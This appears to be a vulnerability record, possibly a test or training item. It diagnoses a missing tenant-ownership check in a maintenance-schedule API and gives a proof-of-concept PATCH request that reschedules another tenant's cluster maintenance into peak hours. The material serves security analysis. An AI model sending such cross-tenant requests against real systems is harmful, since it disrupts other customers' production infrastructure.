diagnosis: The handler updates cluster maintenance cron expressions based on scheduleId without checking whether req.user.tenantId matches schedule.tenant_id. An administrative user in tenant A can disrupt tenant B's database and Kubernetes nodes by moving maintenance windows to peak production hours.
exploit_request:
PATCH /api/maintenance/schedules/sched_prod_k8s_cluster_991 HTTP/1.1
Host: infra.cloudops.net
Authorization: Bearer <tenant_a_admin_token>
Content-Type: application/json

{"cronExpression": "0 12 * * 1-5", "maintenanceWindowHours": 8}
